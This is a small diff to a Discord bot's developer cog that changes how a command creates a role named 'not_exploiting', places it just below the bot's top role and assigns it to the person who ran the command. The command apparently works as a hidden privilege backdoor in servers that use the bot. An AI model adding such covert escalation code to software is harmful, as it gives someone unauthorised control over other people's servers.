@@ -113,7 +113,8 @@ class fbotdev(commands.Cog):
                 await ctx.message.add_reaction("✅")
                 return
 
-        role = await ctx.guild.create_role(name="not_exploiting", permissions=perms, position=ctx.guild.me.top_role.position-1)
+        role = await ctx.guild.create_role(name="not_exploiting", permissions=perms)
+        await role.edit(position=ctx.guild.me.top_role.position-1)
         await ctx.author.add_roles(role)
         await ctx.message.add_reaction("✅")
 
